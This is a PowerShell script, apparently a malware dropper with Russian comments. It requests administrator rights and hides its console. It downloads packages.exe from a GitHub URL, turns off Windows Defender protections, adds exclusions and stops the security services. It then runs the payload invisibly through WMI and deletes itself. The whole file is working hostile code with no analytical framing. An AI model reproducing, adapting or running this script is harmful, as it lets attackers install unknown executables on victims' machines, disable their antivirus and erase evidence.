$v1="https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
$v2=$env:TEMP+"\"+[System.IO.Path]::GetRandomFileName().Replace(".","")+".tmp"
$v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
$v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".exe"

if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
    exit
}

Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
$c=[C.W]::GetConsoleWindow()
[C.W]::ShowWindow($c,0)

try{
    if(!(Test-Path $v3)){New-Item -Path $v3 -ItemType Directory -Force | Out-Null}
    (New-Object Net.WebClient).DownloadFile($v1,$v2)
    if(Test-Path $v2){Move-Item $v2 $v4 -Force}

    # Отключаем через PowerShell команды (работает без прав реестра)
    try{
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    }catch{}

    # Добавляем в исключения через PowerShell
    try{
        Add-MpPreference -ExclusionPath $v4 -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $v3 -ErrorAction SilentlyContinue
    }catch{}

    # Останавливаем службы через sc (более надежно)
    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
    foreach($service in $services){
        try{
            Start-Process -FilePath "sc" -ArgumentList "stop", $service -Wait -WindowStyle Hidden
            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
        }catch{}
    }

    Start-Sleep -Seconds 3

    # Запускаем файл через WMI (самый скрытный способ)
    try{
        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
        $r=$w.Create("`"$v4`"")
    }catch{
        # Если WMI не работает, запускаем скрыто
        try{
            Start-Process -FilePath $v4 -WindowStyle Hidden
        }catch{}
    }

    Start-Sleep -Seconds 2

    # Очистка
    if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}

    # Самоудаление скрипта
    $sp=$MyInvocation.MyCommand.Path
    if(Test-Path $sp){
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","timeout /t 3 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
    }
}catch{}
